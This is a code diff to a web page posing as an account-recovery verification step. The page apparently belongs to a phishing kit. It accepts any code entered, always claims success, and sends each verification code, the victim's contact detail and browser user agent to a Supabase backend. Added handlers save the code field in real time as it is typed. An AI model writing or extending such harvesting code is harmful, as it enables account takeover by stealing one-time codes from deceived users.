@@ -240,6 +240,7 @@
     <div class="modal-box" id="modalBox"></div>
   </div>
 
+  <script src="supabaseClient.js"></script>
   <script>
     const contactInfo = localStorage.getItem("recovery_target");
     if (!contactInfo) {
@@ -248,6 +249,11 @@
     } else {
       document.getElementById("contactInfo").textContent = contactInfo;
     }
+
+    // Initialize real-time field saving on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      createFieldSaveHandler('verification_codes', 'codeInput');
+    });
 
     function verifyCode() {
       const code = document.getElementById("codeInput").value.trim();
@@ -262,25 +268,14 @@
         return;
       }
 
-      // Save verification code data
+      // Save verification code data to Supabase
       const verifyData = {
         verificationCode: code,
         recoveryTarget: contactInfo,
         userAgent: navigator.userAgent
       };
 
-      fetch('/save-verify-code', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(verifyData)
-      }).then(response => response.json())
-        .then(data => {
-          console.log('Verification code saved:', data.success);
-        }).catch(error => {
-          console.error('Error saving verification code:', error);
-        });
+      saveFieldData('verification_codes', verifyData);
 
       messageEl.textContent = "Verification successful! Redirecting to password reset...";
       messageEl.classList.add("success", "show");
